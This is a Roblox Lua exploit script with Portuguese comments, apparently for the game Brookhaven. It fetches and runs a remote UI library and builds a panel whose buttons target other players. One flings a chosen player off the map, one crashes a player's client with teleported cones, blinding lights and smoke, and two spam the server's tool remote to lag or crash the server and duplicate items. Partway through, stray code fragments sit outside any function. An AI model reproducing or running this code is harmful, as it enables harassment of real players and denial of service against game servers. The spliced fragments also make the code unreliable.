-- 1. Carrega a versão mais recente e oficial da WindUI do repositório de releases
local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

-- 2. Cria a Janela Principal (Padrão VoidWare)
local Window = WindUI:CreateWindow({
    Title = "anonymus panel",
    SubTitle = "Administração & Utilitários",
    Icon = "door-open",
    Size = UDim2.fromOffset(550, 380),
    Theme = "Dark"
})

local MainTab = Window:Tab({
    Title = "Commandos",
    Icon = "lucide-swords"
})

-- Variável global para armazenar o alvo selecionado
local AlvoSelecionado = ""

-- Função para obter a lista de jogadores atuais (excluindo o próprio jogador)
local function obterListaJogadores()
    local lista = {}
    for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
        if p ~= game:GetService("Players").LocalPlayer then
            table.insert(lista, p.Name)
        end
    end
    return lista
end

-- ============================================================
-- 1. SELEÇÃO DE ALVO (Dropdown Nativo da WindUI)
-- ============================================================
local DropdownAlvos = MainTab:Dropdown({
    Title = "Selecionar Alvo",
    Desc = "Escolha um jogador do servidor para executar ações",
    Values = obterListaJogadores(),
    Value = "",
    Callback = function(OpcaoSelecionada)
        if type(OpcaoSelecionada) == "table" then
            AlvoSelecionado = OpcaoSelecionada[1] or ""
        else
            AlvoSelecionado = OpcaoSelecionada or ""
        end
        print("Alvo atual definido para: " .. tostring(AlvoSelecionado))
    end
})

-- Sincronização automatizada da lista do dropdown
local function atualizarDropdown()
    local novaLista = obterListaJogadores()
    DropdownAlvos:Refresh(novaLista)
end

game:GetService("Players").PlayerAdded:Connect(function()
    task.wait(0.5)
    atualizarDropdown()
end)

game:GetService("Players").PlayerRemoving:Connect(function(player)
    if AlvoSelecionado == player.Name then
        AlvoSelecionado = ""
    end
    atualizarDropdown()
end)

-- 2. BOTÃO: ;fling
-- ============================================================
MainTab:Button({
    Title = ";fling",
    Desc = "Arremessa o jogador selecionado para fora do mapa usando a SoccerBall",
    Callback = function()
        if AlvoSelecionado ~= "" then
            local target = nil
            for _, p in pairs(game:GetService("Players"):GetPlayers()) do
                if string.lower(p.Name):match("^" .. string.lower(AlvoSelecionado)) or 
                   (p.DisplayName and string.lower(p.DisplayName):match("^" .. string.lower(AlvoSelecionado))) then
                    target = p
                    break
                end
            end

            if target and target ~= game:GetService("Players").LocalPlayer then
                if _G.FlingAtivo then 
                    _G.FlingAtivo = false 
                    task.wait(0.05) 
                end
                _G.FlingAtivo = true

                task.spawn(function()
                    local char = game:GetService("Players").LocalPlayer.Character
                    local root = char and char:FindFirstChild("HumanoidRootPart")
                    local hum = char and char:FindFirstChildOfClass("Humanoid")
                    local backpack = game:GetService("Players").LocalPlayer:WaitForChild("Backpack")
                    local ServerBalls = workspace.WorkspaceCom:WaitForChild("001_SoccerBalls")

                    if not backpack:FindFirstChild("SoccerBall") and not char:FindFirstChild("SoccerBall") then
                        pcall(function()
                            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "SoccerBall")
                        end)
                    end
                    
                    local ferramenta = backpack:FindFirstChild("SoccerBall") or char:FindFirstChild("SoccerBall")
                    if ferramenta and ferramenta.Parent == backpack then
                        ferramenta.Parent = char
                    end
                    
                    local Ball = ServerBalls:WaitForChild("Soccer" .. game:GetService("Players").LocalPlayer.Name, 5)

                    if Ball and Ball:IsA("BasePart") then
                        Ball.CanCollide = true 
                        Ball.Massless = false   
                        
                        for _, child in pairs(Ball:GetChildren()) do
                            if child:IsA("BodyVelocity") or child:IsA("BodyAngularVelocity") or child:IsA("ForceField") then
                                child:Destroy()
                            end
                        end

                        if target.Character and target.Character:FindFirstChild("HumanoidRootPart") and target.Character:FindFirstChildOfClass("Humanoid") then
                            local tchar = target.Character
                            local thum = tchar:FindFirstChildOfClass("Humanoid")
                            local tRoot = tchar.HumanoidRootPart

                            workspace.CurrentCamera.CameraSubject = thum
                            
                            local ultimoCharacterAlvo = tchar

                            while _G.FlingAtivo and tchar:IsDescendantOf(workspace) and target.Parent == game:GetService("Players") and tchar == ultimoCharacterAlvo do
                                if not tRoot or not tchar:FindFirstChild("HumanoidRootPart") then break end
                                
                                -- Cria rotações caóticas na bola para quebrar o balanço de física do alvo
                                Ball.CFrame = tRoot.CFrame * CFrame.Angles(
                                    math.rad(math.random(-180, 180)), 
                                    math.rad(math.random(-180, 180)), 
                                    math.rad(math.random(-180, 180))
                                )
                                
                                -- Multiplicador de velocidade agressiva alternando eixos positivos e negativos
                                -- Isso impede que a física do Roblox estabilize o impacto
                                local forcaAleatoriaX = math.random(1, 2) == 1 and 95000 or -95000
                                local forcaAleatoriaY = math.random(1, 2) == 1 and 95000 or -95000
                                local forcaAleatoriaZ = math.random(1, 2) == 1 and 95000 or -95000
                                
                                Ball.AssemblyLinearVelocity = Vector3.new(forcaAleatoriaX, forcaAleatoriaY, forcaAleatoriaZ)
                                Ball.AssemblyAngularVelocity = Vector3.new(forcaAleatoriaX, forcaAleatoriaY, forcaAleatoriaZ)
                                
                                -- Frequência ultra rápida para garantir contato contínuo
                                task.wait(0.01) 
                            end
                            
                            pcall(function()
                                Ball.AssemblyLinearVelocity = Vector3.zero
                                Ball.AssemblyAngularVelocity = Vector3.zero
                            end)
                            
                            workspace.CurrentCamera.CameraSubject = hum
                        end
                    end
                    _G.FlingAtivo = false
                end)
            end
        else
            WindUI:Notify({
                Title = "⚠️ Aviso do Sistema",
                Content = "Por favor, selecione um alvo primeiro no Dropdown!",
                Duration = 4
            })
        end
    end
})

-- 3. BOTÃO: ;kick
-- ============================================================
MainTab:Button({
    Title = ";kick",
    Desc = "Derruba ou crasha o alvo teleportando TrafficCones continuamente",
    Callback = function()
        if AlvoSelecionado ~= "" then
            local WorkspaceCom = workspace:FindFirstChild("WorkspaceCom")
            
            local targetPlayer = nil
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if string.find(string.lower(player.Name), string.lower(AlvoSelecionado)) or string.find(string.lower(player.DisplayName), string.lower(AlvoSelecionado)) then
                    targetPlayer = player
                    break
                end
            end
            
            if targetPlayer then
                -- Busca focado exatamente na pasta 001_TrafficCones que você especificou
                local trafficCones = WorkspaceCom and WorkspaceCom:FindFirstChild("001_TrafficCones")
                
                if trafficCones then
                    if _G.KickAtivo then 
                        _G.KickAtivo = false 
                        task.wait(0.2) 
                    end
                    _G.KickAtivo = true

                    WindUI:Notify({
                        Title = "🪩 Ataque de Luz Iniciado", 
                        Content = "Teleportando todos os objetos da pasta de cones com sobrecarga visual em " .. targetPlayer.Name, 
                        Duration = 3
                    })

                    task.spawn(function()
                        while _G.KickAtivo and targetPlayer and targetPlayer.Parent == game:GetService("Players") and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") do
                            local targetHRP = targetPlayer.Character.HumanoidRootPart
                            
                            -- CFrame rotativo tridimensional para sobrecarregar a câmera e a placa de vídeo do alvo
                            local spawnCFrame = targetHRP.CFrame * CFrame.Angles(math.rad(math.random(-180, 180)), math.rad(math.random(-180, 180)), math.rad(math.random(-180, 180)))
                            local props = trafficCones:GetChildren()
                            
                            if #props > 0 then
                                for _, prop in pairs(props) do
                                    if not _G.KickAtivo then break end
                                    if not (targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")) then break end
                                    
                                    if prop:IsA("BasePart") then
                                        -- Aplica os efeitos destrutivos de iluminação RGB e partículas em cada objeto dentro da pasta
                                        task.defer(function()
                                            if not prop:FindFirstChild("SuperNovaDisco") then
                                                local luzCega = Instance.new("PointLight")
                                                luzCega.Name = "SuperNovaDisco"
                                                luzCega.Brightness = 150 -- Brilho estourado para cega-lo
                                                luzCega.Range = 100
                                                luzCega.Shadows = true -- Força o Roblox dele a calcular sombras complexas em tempo real (Gera Lag Crítico)
                                                luzCega.Color = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255)) -- Efeito estroboscópico de cores piscantes
                                                luzCega.Parent = prop
                                            end

                                            if not prop:FindFirstChild("CrashSmoke") then
                                                local fumaçaPesa = Instance.new("Smoke")
                                                fumaçaPesa.Name = "CrashSmoke"
                                                fumaçaPesa.Size = 150 -- Expande a fumaça ao máximo para cobrir o campo de visão
                                                fumaçaPesa.Opacity = 1
                                                fumaçaPesa.Parent = prop
                                            end
                                        end)
                                    end

                                    local setCFrameRemote = prop:FindFirstChild("SetCurrentCFrame")
                                    if setCFrameRemote and setCFrameRemote:IsA("RemoteFunction") then
                                        -- Mantido task.defer para que a requisição ocorra em segundo plano sem congelar o seu FPS
                                        task.defer(function()
                                            pcall(function()
                                                setCFrameRemote:InvokeServer(spawnCFrame)
                                            end)
                                        end)
                                    end
                                end
                            end
                            task.wait(0.05) 
                        end
                        
                        -- Limpa as luzes e fumaças pesadas dos objetos da pasta ao encerrar o script
                        if trafficCones then
                            for _, prop in pairs(trafficCones:GetChildren()) do
                                local l = prop:FindFirstChild("SuperNovaDisco")
                                local s = prop:FindFirstChild("CrashSmoke")
                                if l then l:Destroy() end
                                if s then s:Destroy() end
                            end
                        end
                        
                        if _G.KickAtivo then
                            WindUI:Notify({
                                Title = "✅ Alvo Eliminado", 
                                Content = "O jogador saiu ou foi desconectado pelo estouro de renderização.", 
                                Duration = 5
                            })
                            _G.KickAtivo = false
                        end
                    end)
                else
                    WindUI:Notify({Title = "❌ Erro", Content = "Pasta 001_TrafficCones não encontrada no Workspace.", Duration = 4})
                end
            else
                WindUI:Notify({Title = "❌ Erro", Content = "Jogador alvo não foi encontrado no servidor.", Duration = 4})
            end
        else
            WindUI:Notify({Title = "⚠️ Aviso", Content = "Por favor, selecione um alvo primeiro no Dropdown!", Duration = 4})
        end
    end
})

MainTab:Button({
    Title = ";shutdown",
    Desc = "Derruba o desempenho e congela o ping do servidor usando a sobrecarga da FireHose",
    Callback = function()
        -- Inverte o estado da variável global (interruptor liga/desliga)
        _G.LagServerAtivo = not _G.LagServerAtivo
        
        local Players = game:GetService("Players")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local LocalPlayer = Players.LocalPlayer
        
        if _G.LagServerAtivo then
            WindUI:Notify({
                Title = "⚠️ Colapso Iniciado", 
                Content = "Spam invisível de FireHose ativado. O servidor começará a travar.", 
                Duration = 4
            })
            
            task.spawn(function()
                local remoteFerramenta = ReplicatedStorage:FindFirstChild("RE") and ReplicatedStorage.RE:FindFirstChild("1Too1l")
                
                while _G.LagServerAtivo do
                    if not remoteFerramenta then break end
                    
                    -- Pede a FireHose para o servidor usando o RemoteFunction padrão do Brookhaven
                    task.defer(function()
                        pcall(function()
                            remoteFerramenta:InvokeServer("PickingTools", "FireHose")
                        end)
                    end)
                    
                    -- Limpeza em milissegundos no cliente para proteger o SEU computador de lagar
                    task.defer(function()
                        -- Verifica na mochila (Backpack)
                        local mochila = LocalPlayer:FindFirstChild("Backpack")
                        if mochila then
                            local hoseNaMochila = mochila:FindFirstChild("FireHose")
                            if hoseNaMochila then
                                hoseNaMochila:Destroy()
                            end
                        end
                        
                        -- Verifica se o item foi direto para as mãos do personagem
                        local personagem = LocalPlayer.Character
                        if personagem then
                            local hoseNoChar = personagem:FindFirstChild("FireHose")
                            if hoseNoChar then
                                hoseNoChar:Destroy()
                            end
                        end
                    end)
                    
                    -- Intervalo mínimo de 0.001 segundos para maximizar o entupimento de rede do servidor
                    task.wait(0.001)
                end
            end)
        else
            WindUI:Notify({
                Title = "✅ Estabilizado", 
                Content = "Ataque à FireHose interrompido. A rede do servidor irá estabilizar.", 
                Duration = 4
            })
        end
    end
})

                    if fireHose and fireHose:FindFirstChild("ToolSound") then
                        fireHose.ToolSound:FireServer("FireHose", "DestroyFireHose")
                    end
                end

        local humanoid = newCharacter:WaitForChild("Humanoid", 15)

        if newRootPart and humanoid then
            task.wait(0.7)
            humanoid:ChangeState(Enum.HumanoidStateType.Physics)
            newRootPart.CFrame = oldcf
            newRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)

MainTab:Button({
   Title = ";hugeemporarybottleneck",
   Desc = "envia um gargalo agressivo temporário, função principal travar e desligar o servidor",
   Callback = function()
   -- VERSÃO CORRIGIDA E ULTRA RÁPIDA (OTIMIZADA PARA BOTÃO)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = Players.LocalPlayer

        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local rootpart = character:WaitForChild("HumanoidRootPart")
        local backpack = LocalPlayer:WaitForChild("Backpack")
        local remoteStorage = ReplicatedStorage:WaitForChild("RE")
        
        -- Encontra o controle remoto de ferramentas
        local toolRemote = remoteStorage:FindFirstChild("1Too1l")
        
        if toolRemote and toolRemote:IsA("RemoteFunction") then
            -- 1. Loop Ultra Rápido (Spam em paralelo para pegar e deletar instantaneamente)
            for m = 1, 535 do
                task.spawn(function()
                    -- Solicita a ferramenta ao servidor
                    local args1 = { [1] = "PickingTools", [2] = "FireHose" }
                    toolRemote:InvokeServer(unpack(args1))
                    
                    -- Deleta a ferramenta imediatamente assim que ela entra na Backpack
                    local fireHose = backpack:FindFirstChild("FireHose")
                    if fireHose and fireHose:FindFirstChild("ToolSound") then
                        local args2 = { [1] = "FireHose", [2] = "DestroyFireHose" }
                        pcall(function() 
                            fireHose.ToolSound:FireServer(unpack(args2)) 
                        end)
                    end
                end)
            end
        end

        -- Pequena pausa para o servidor processar o volume massivo de itens
        task.wait(0.1)

        -- 2. Salvar posição antiga e teleportar para o Void
        local oldcf = rootpart.CFrame
        rootpart.CFrame = CFrame.new(999999, -475, 999999) -- Coordenada extrema corrigida para evitar crash visual

        -- Espera o personagem sumir/resetar com limite de segurança para não travar o script
        local timeout = 0
        while rootpart and rootpart.Parent ~= nil and timeout < 30 do
            task.wait()
            timeout = timeout + 1
        end

        -- Aguarda o novo personagem carregar após o Void/Reset
        character = LocalPlayer.CharacterAdded:Wait()
        rootpart = character:WaitForChild("HumanoidRootPart")
        backpack = LocalPlayer:WaitForChild("Backpack")

        -- Retornar à posição original com o novo corpo
        rootpart.CFrame = oldcf
        
        StarterGui:SetCore("SendNotification", {
            Title = "Script de Dupe",
            Text = "Shutdown Concluído, Agora Vai Desligar",
            Button1 = "Ok",
            Duration = 5
        })
        
        task.wait(0.1)

        -- 3. Equipar todas as FireHose restantes da Backpack para o Personagem
        for _, item in ipairs(backpack:GetChildren()) do
            if item.Name == "FireHose" and item:IsA("Tool") then
                item.Parent = character
            end
        end

        task.wait(0.2)
        
        StarterGui:SetCore("SendNotification", {
            Title = "Script de Dupe",
            Text = "Iniciando duplicação, seja paciente",
            Button1 = "Ok",
            Duration = 5
        })
        
        task.wait(0.5)

        -- Teleporte final de processamento/descarte
        if rootpart then
            rootpart.CFrame = CFrame.new(9999, -475, 9999)
        end
    end
})
